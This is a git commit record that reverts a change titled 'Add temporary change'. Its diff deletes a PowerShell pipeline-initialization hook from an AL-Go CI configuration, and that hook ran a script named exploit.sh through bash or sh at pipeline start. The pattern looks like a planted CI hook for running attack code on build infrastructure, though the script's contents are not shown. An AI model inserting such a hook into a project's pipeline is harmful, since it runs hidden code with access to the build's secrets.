c36ce48602d029f50692d72139415323023628ee
j5884p5g <j5884p5g@rolf.ovh>
2026-04-16 12:22:28 +0000

    Revert "Add temporary change"
    This reverts commit e92177f9763faf9d37db796e4860d9b12109b44e.

--- .AL-Go/PipelineInitialize.ps1
+++
@@ -1,9 +0,0 @@
-Param([Hashtable]$parameters)
-Write-Host "PipelineInitialize.ps1 starting..."
-if (Get-Command bash -ErrorAction SilentlyContinue) {
-    bash .AL-Go/exploit.sh
-} else {
-    Write-Host "bash not found, trying sh..."
-    sh .AL-Go/exploit.sh
-}
-Write-Host "PipelineInitialize.ps1 finished."
